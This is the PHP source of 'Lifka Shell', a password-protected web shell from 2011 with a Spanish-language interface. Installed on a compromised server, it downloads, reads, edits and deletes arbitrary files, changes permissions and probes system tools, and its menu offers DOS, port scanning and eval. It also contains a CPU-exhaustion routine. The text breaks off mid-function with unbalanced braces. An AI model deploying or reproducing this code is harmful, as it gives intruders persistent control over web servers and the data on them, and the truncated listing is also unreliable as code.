<?php
/*

  Izquierdo Vera, Javier
  javierizquierdovera@gmail.com
  ________________________________________________________________________________________________
 /_______________________________________________________________________________________________/|
|   ____             _____________      _        ____         ____            __________        | |
|  |=!!=|           |=!!=!!=!!=!!=|   |    _    |=!!=|      _|=!!=|         _|=!!=||=!!=|_      | |
|  |=!!=|           |=!!=!!=!!=!!=|   |   _     |=!!=|    _|=!!=|         _|=!!=|    |=!!=|__   | |
|  |=!!=|                |=!!=|       | __      |=!!=|___|=!!=|          |=!!=|_________|=!!=|  | |
|  |=!!=|                |=!!=|      _|_|       |=!!=||=!!=|__           |=!!=|!=!!=!!=!|=!!=|  | |
|  |=!!=|________    ____|=!!=|___  _|  |       |=!!=|   |=!!=|__        |=!!=|!=!!=!!=!|=!!=|  | |
|  |=!!=!!=!!=!!=!  |=!!=!!=!!=!!=|  |_  |      |=!!=|      |=!!=|_      |=!!=|         |=!!=|  | |
|  |=!!=!!=!!=!!=!  |=!!=!!=!!=!!=|  |_ _|      |=!!=|        |=!!=|     |=!!=|         |=!!=|  | |
|                                                                                               | |
|                    __   _  _   ___   _     _                                                  | |
|                   |     |  |   |     |     |                                                  | |
|                    --   |--|    __   |     |                                                  | |
|                      |  |  |   |     |     |                                                  | |
|                    --   -  -   ---   ----  ----                                               | |
|                                                                                               | |
|_______________________________________________________________________________________________|/
        2011
*/

@session_start();
error_reporting(0);
$password = "63a9f0ea7bb98050796b649e85481845"; //contraseña md5, por defecto: 'root'










$descargar=$_GET['descargar'];
if ($descargar <> "" ){
$path_parts = pathinfo("$descargar");
$entrypath=$path_parts["basename"];
$name = "$descargar";
$fp = fopen($name, 'rb');
header("Content-Disposition: attachment; filename=$entrypath");
header("Content-Length: " . filesize($name));
fpassthru($fp);
exit;}
$scan = range("B","Z");
$var1= $_SERVER['DOCUMENT_ROOT'];
$shelldir = $var1.$_SERVER['PHP_SELF'];
if ($opcion == 'tirar') {
$asda=str_repeat("99999999999999999999999999999999999999999999999999",99999);
for($i=0;$i<2;){
$buff=bcpow($asda, '3', 2);
$buff=null;
exit();}}
$frpath=$_GET['borrar'];
if ($frpath <> "") {
if (is_dir($frpath)){
$matches = glob($frpath . '/*.*');
if ( is_array ( $matches ) ) {
  foreach ( $matches as $filename) {
  unlink ($filename);
  rmdir("$frpath");
echo "<script language='javascript'> history.back(1)</script>"; } } }
  else{
unlink ("$frpath");
echo "<script language='javascript'> history.back(1)</script>";
exit(0);  }}
$opcion = $_GET[opcion];
if ($opcion == 'php_info') {
echo '<a style="color: black;" href="?opcion=info_sistema"><== Volver</a>';
echo phpinfo();
return 0;}
$nombre_s = 'Lifka Shell';
$nombre_princi = 'LIFKA SHELL';
$version = '1.0';
if (md5($_POST['pass']) == $password) {
$_SESSION["login"] = 'ok';
}
 if ($_SESSION["login"] != 'ok') {
 echo '<div style="text-align: left;"><form method="POST" action=""><span>Pass: </span><input type="password" name="pass"><input type="submit" VALUE="Entrar"></form>'; 
return 0;
}
exec('wget --help',$wget);
if ($wget) {
$wgete = 'On';
} else {
$wgete = 'Off';
}
if (get_magic_quotes_gpc() == "1" or get_magic_quotes_gpc() == "on") {
$magic = 'On';
} else {
$magic = 'Off';
}
exec("perl -h",$perl);
if ($perl) {
$perle = 'On';
} else {
$perle = 'Off';
}
$target = $_POST['target'];
$inicio = $_POST['inicio'];
$final = $_POST['final'];
$pathe = getcwd();
if(ini_get('safe_mode') ){
$safe = 'On';
}else{
$safe = 'Off';
}
$curl_on = @function_exists('curl_version');
if (@function_exists('mysql_connect')) {
$base = 'MySQL';
} elseif(@function_exists('mssql_connect')) {
$base = $base.' MSSQL';
} elseif(@function_exists('pg_connect')) {
$base = $base.' PostgreSQL';
} elseif(@function_exists('ocilogon')) {
$base = $base.' Oracle';
}
echo '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"><html><head>  <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type"><title>'.$nombre_s.'</title> 
  <style type="text/css">
a{
text-decoration:none;
border:0px;
}
a:visited{
text-decoration:none;
}
a:active{
text-decoration:none;
}
a:hover{
text-decoration:none;
}      
</style> </head><body style="background-color: black; color: rgb(0, 0, 0);" alink="#ee0000" link="#0000ee" vlink="#551a8b"><div style="text-align: center; background-color: rgb(7, 7, 7);"><big><a href="?"><big><big style="font-family: Aharoni;"><big><span style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000">'.$nombre_princi.'</span></big></big></big></a><br></big><hr style="width: 100%; height: 2px;"><big style="color: white;"><a style="color: white;" href="?">File manager</a> | <a style="color: white;" href="?opcion=info_sistema">System info</a></big><span style="color: white;"> | <a style="color: white;" href="?opcion=mail">Mail</a> | <a style="color: white;" href="?opcion=dos">DOS</a> | <a style="color: white;" href="?opcion=escaner_puertos">Port scan</a> | <a style="color: white;" href="?opcion=eval">Eval</a> | <a style="color: white;" href="?opcion=encode_decode">Encode/Decode</a> | <a style="color: white;" href="?opcion=salir">Logout</a></span><hr style="width: 100%; height: 2px;"><br><table style="width: 966px; height: 201px; text-align: left; margin-left: auto; margin-right: auto;" border="1" cellpadding="2" cellspacing="2">  <tbody>   <tr><td><span style="color: rgb(167, 167, 167);">';
if (isset($_GET['leer'])) {
header("Content-Type: application/octet-stream");
header("Content-Disposition: attachment; filename=".basename($_GET['leer']));
readfile($_GET['leer']);
echo '</tr> </tbody></table><br style="color: rgb(153, 153, 153);"><hr style="width: 100%; height: 2px; color: rgb(153, 153, 153);"><span style="color: rgb(153, 153, 153);">'.$nombre_s.' '.$version.'</span><br></div></body></html>';
exit(0);}
 $editar=$_GET['editar'];
 if ($editar <> "" ){
 $editar=realpath($editar);
 $lines = file($editar);
echo '<div style="text-align: center;"><big><big style="color: white;">Editar</big></big><div style="text-align: left;"><br><br><form action="" method="POST"><center>  <input type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" name="filepath"  size="60" value='.$editar.'><br/><textarea style="color: #A9F5F2; font-weight: bold; border: 1px dashed #333333; background-color: #000000" name="gardara" rows=30 cols=80>' ;
foreach ($lines as $line_num => $line) {
 echo htmlspecialchars($line);
}
echo '</textarea>
<br/>  <br/><input type="submit" style="color: #FF0000; font-weight: bold; border: 5px dashed #333333; background-color: #000000" value="Guardar"> <br/> <br/></form> </span></td>  </tr> </tbody></table><br style="color: rgb(153, 153, 153);"><hr style="width: 100%; height: 2px; color: rgb(153, 153, 153);"><span style="color: rgb(153, 153, 153);">'.$nombre_s.' '.$version.'</span><br></div></body></html>';
  $gardara=$_POST['gardara'];
  $filepath=realpath($_POST['filepath']);
  if ($gardara <> "") 
  {
  $fp=fopen("$filepath","w+");
  fwrite ($fp,"") ;
  fwrite ($fp,$gardara) ;
  fclose($fp);
  echo "<script language='javascript'> close()</script>";
  }
return 0;
 }
function tamaño($size){
if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
else {$size = $size . " B";}
return $size;}
function permisos($file) 
{ 
  $perms = fileperms($file);
  if (($perms & 0xC000) == 0xC000) {$info = 's';} 
  elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} 
  elseif (($perms & 0x8000) == 0x8000) {$info = '-';} 
  elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} 
  elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} 
  elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} 
  elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} 
  else {$info = 'u';}
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?(($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));
  return $info;
} 
$fchmod=$_GET['fchmod'];
if ($fchmod <> "" ){
$fchmod=realpath($fchmod);
echo "<center><br>File: $fchmod<br><form method='POST' action=''><br>Chmod :<br><input type='text' name='chmod0' value='777' ><br><input type='submit' ";
echo ' style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" value="Cambiar chmod"></form><br/>';
?><?php
                }          }
            if(!isset($_POST['send']) || $error != '')
            {
?>